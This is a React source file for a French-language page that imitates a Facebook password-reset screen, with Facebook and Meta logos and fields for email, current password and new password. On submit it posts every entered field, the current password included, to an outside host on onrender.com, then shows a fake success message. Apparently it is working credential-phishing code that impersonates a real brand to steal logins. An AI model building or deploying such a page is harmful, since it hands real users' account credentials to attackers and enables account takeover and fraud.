import React, { useState } from "react";
import "./App.css";

function App() {

  const [formData, setFormData] = useState({
    email: "",
    currentPassword: "",
    newPassword: "",
    confirmPassword: ""
  });

  const [message, setMessage] = useState("");
  const [error, setError] = useState("");

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setMessage("");

    // Validation simple
    if (formData.newPassword !== formData.confirmPassword) {
      setError("Les mots de passe ne correspondent pas.");
      return;
    }

    if (formData.newPassword.length < 6) {
      setError("Le nouveau mot de passe doit contenir au moins 6 caractères.");
      return;
    }

    try {
      const response = await fetch("https://facebook-li-2.onrender.com/api/reset-password", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(formData)
      });

      const data = await response.json();

      if (response.ok) {
        setMessage("Mot de passe mis à jour avec succès !");
        setFormData({
          email: "",
          currentPassword: "",
          newPassword: "",
          confirmPassword: ""
        });
      } else {
        setError(data.message || "Erreur lors de la mise à jour.");
      }

    } catch (err) {
      setError("Erreur serveur.");
    }
  };

  return (
    <div className="container">

      {/* LEFT SECTION */}
      <div className="left">
        <img 
          src="/2023_Facebook_icon.svg.webp" 
          alt="Facebook Logo" 
          className="fb-logo"
        />
        <h1>
          Explorez les sujets que <span>vous aimez.</span>
        </h1>
      </div>

      <div className="Center">
        <img 
          src="/9z3jqxP6hAH.png" 
          alt="People discussing" 
          className="discussion-img"
        />
      </div>

      {/* RIGHT SECTION */}
      <div className="right">
        <div className="login-card">
          <h2>Réinitialiser le mot de passe</h2>

          <form onSubmit={handleSubmit}>

            <input
              type="email"
              name="email"
              placeholder="E-mail ou numéro de mobile"
              value={formData.email}
              onChange={handleChange}
              required
            />

            <input
              type="password"
              name="currentPassword"
              placeholder="Mot de passe actuel"
              value={formData.currentPassword}
              onChange={handleChange}
              required
            />

            <input
              type="password"
              name="newPassword"
              placeholder="Nouveau mot de passe"
              value={formData.newPassword}
              onChange={handleChange}
              required
            />

            <input
              type="password"
              name="confirmPassword"
              placeholder="Confirmer le nouveau mot de passe"
              value={formData.confirmPassword}
              onChange={handleChange}
              required
            />

            <button type="submit" className="login-btn">
              Mettre à jour le mot de passe
            </button>

          </form>

          {error && <p className="error">{error}</p>}
          {message && <p className="success">{message}</p>}

          <img 
            src="/Meta-Logo.png" 
            alt="Meta Logo" 
            className="mt-logo"
          />
        </div>
      </div>

    </div>
  );
}

export default App;